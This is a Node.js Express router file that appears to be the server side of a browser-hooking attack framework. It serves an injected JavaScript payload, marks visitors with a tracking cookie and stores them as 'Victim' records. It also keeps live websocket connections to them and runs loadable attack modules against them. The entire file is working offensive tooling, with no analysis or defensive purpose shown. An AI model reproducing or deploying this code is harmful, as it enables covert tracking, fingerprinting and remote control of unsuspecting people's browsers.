var express = require('express'),
    router = express.Router(),
    auws = {};

router.all('/', function(req, res){
    res.header('Content-Type', 'application/javascript');
    return res.render('index', {
        protocol:config.ssl?'https:':'',
        host:config.host||req.header('host'),
        id:req.query.x||'Default'
    });
});

router.all('/x/', function(req, res){
    // who id can use Fingerprinting.js
    var xid =  req.param('id'),
        isdef = (xid == 'Default'),
        who = req.cookies.who;
    sql.Victim.findOne({who:who}, function(err, info){
        if(info)return res.jsonp(info.load);
        sql.Item.findOne(isdef?{'_id':xid}:{'group':xid}, function(err, info){
            if(!info)return res.jsonp({err:404});
            var group = info.group||req.header('referer')||'Default';
            who = sql.hash(group+xid+Math.random());
            res.cookie('who', who);
            sql.Victim.create({
                group:group,
                who:who,
                name:info.name+'_'+Date.now(),
                payload:info.payload,
                modules:info.modules,
                status:{},
                now:Date.now()
            });
            return res.jsonp(info.load);
        });
    });
});

function online(who, on){
    sql.Victim.findOne({who:who}, function(err, info){
        info&&sql.Victim.update({who:who}, {
            now:on
        });
    });
};
function handle(req, res, modules, auws, victim, who, msg){
    var path = fs.realpathSync('.');
    req.session.share = req.session.share||{};
    for(var i in modules){
        if(typeof req.session.share[modules[i][0]] != 'object'){
            req.session.share[modules[i][0]] = [];
        };
        try{
            if(!fs.lstatSync(path+'/'+modules[i][0]).isDirectory())throw 'path error.';
            var m = require(path+'/modules/'+modules[i][0]+'/'+modules[i][0]);
        }catch(err){
            req.session.share[modules[i][0]].unshift({'err':err});
            continue;
        };
        req.session.share[modules[i][0]].unshift(
            m({q:req, s:res}, {v:victim, w:who}, {p:modules[i][1], s:req.session.share}, {o:auws, g:msg})
        );
    };
};

var http = function(req, res){
    var pageid = req.params.uri;
    var who = req.cookies.who;
    sql.Page.findOne({uri:pageid}, function(err, info){
//        if(!info||(!who&&!req.session.user))return err404(req, res);
        if(!info)return err404(req, res);
        !req.session.user&&online(who, Date.now());
        handle(req, res, info.modules, null, sql.Victim, who, null);
    });
};
router.all('/e/:uri', http);
router.all('/home/page/:uri', http);

exports.ws = function(ws, req){
    var pageid = req.params.uri;
    var who = req.cookies.who;
    sql.Page.findOne({uri:pageid}, function(err, info){
//        if(!info||(!who&&!req.session.user))return null;
        if(!info)return null;
        var owner = req.session.user?true:false;
        who = req.session.user?null:who;
        ws.on('open', function(){
            auws[who] = ws;
            return !owner&&online(who, 'online');
        });
        ws.on('close', function(){
            delete auws[who];
            return !owner&&online(who, Date.now());
        });
        ws.on('message', function(msg){
            handle(req, ws, info.modules, auws, sql.Victim, who, msg);
        });
    });
};

exports.router = router;
